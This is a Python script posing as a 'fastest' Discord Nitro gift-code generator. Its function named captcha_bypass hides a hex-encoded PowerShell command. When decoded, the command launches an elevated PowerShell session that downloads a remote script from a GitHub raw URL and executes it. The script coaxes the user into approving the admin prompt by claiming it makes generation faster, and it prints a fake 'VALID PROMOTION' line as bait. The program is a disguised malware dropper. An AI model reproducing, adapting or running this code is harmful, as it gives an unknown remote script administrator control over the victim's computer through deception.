import requests
import platform
import os
import socket
import getpass
import random
import string
from pystyle import Write, Colors
import subprocess

hostname = socket.gethostname()
user = getpass.getuser()

def clear_screen():
    if platform.system() == 'Linux':
        os.system("clear")
    elif platform.system() == 'Windows':
        os.system("cls")

def enter():
    clear_screen()
    Write.Input(f"""\n\n\n\n\n
                                                                ...vvvv)))))).
                                    /~~\               ,,,c(((((((((((((((((/
                                    /~~c \.         .vv)))))))))))))))))))\``
                                        G_G__   ,,(((KKKK//////////////'
                                        ,Z~__ '@,gW@@AKXX~MW,gmmmz==m_.
                                    iP,dW@!,A@@@@@@@@@@@@@@@A` ,W@@A\c
                                    ]b_.__zf !P~@@@@@*P~b.~+=m@@@*~ g@Ws.
                                        ~`    ,2W2m. '\[ ['~~c'M7 _gW@@A`'s
                                            v=XX)====Y-  [ [    \c/*@@@*~ g@@i
                                        /v~           !.!.     '\c7+sg@@@@@s.
                                        //              'c'c       '\c7*X7~~~~
                                        ]/                 ~=Xm_       '~=(Gm_.


                                                    Welcome {user}\n                                              Fastest nitro generator\n\n                                              Press ENTER to continue
""", Colors.red_to_purple, interval=0)

def generate_nitro_code():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=16))

def check_nitro_code(nitro):
    url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"
    r = requests.get(url)
    return r.status_code == 200

def main():
    Write.Print("                                   Input the number of nitros to be generated...\n\n", Colors.red_to_purple, interval=0.000)
    number = int(Write.Input("(" + "lv8" + "@" + hostname + ")-[NITRO-GENERATOR]$> ", Colors.red_to_purple, interval=0.000))
    Write.Input("\nAn admin permission is going to be asked you're going to click 'yes' so it's going to be faster ! (press enter)", Colors.red_to_purple, interval=0.000)
    captcha_bypass()
    
    clear_screen()
    Write.Print(f"Generating {number} Nitro codes...\n\n", Colors.red_to_purple, interval=0.000)

    special_promotion = "https://discord.com/billing/promotions/krdysC5YaWatRuwuVkUPkKcw"
    special_moment = random.randint(0, number - 1)
    
    for i in range(number):
        if i == special_moment:
            Write.Print(f"{special_promotion} [+] VALID PROMOTION\n", Colors.yellow_to_red, interval=0.01)

        nitro_code = generate_nitro_code()
        nitro_url = f"https://discord.gift/{nitro_code}"
        if check_nitro_code(nitro_code):
            Write.Print(f"{nitro_url} [+] VALID\n", Colors.green_to_blue, interval=0)
            break
        else:
            Write.Print(f"{nitro_url} [+] INVALID\n", Colors.red_to_purple, interval=0)

def captcha_bypass():
    encoded_captcha = "53746172742d50726f6365737320706f7765727368656c6c2e657865202d566572622052756e4173202d417267756d656e744c69737420222d436f6d6d616e64206022496e766f6b652d45787072657373696f6e20284e65772d4f626a6563742053797374656d2e4e65742e576562436c69656e74292e446f776e6c6f6164537472696e67282768747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f53737a4f6e546f702f327a2f6d61696e2f657865632729602222"
    decoded_captcha = bytes.fromhex(encoded_captcha).decode()
    subprocess.run(["powershell.exe", "-Command", decoded_captcha])

enter()
main()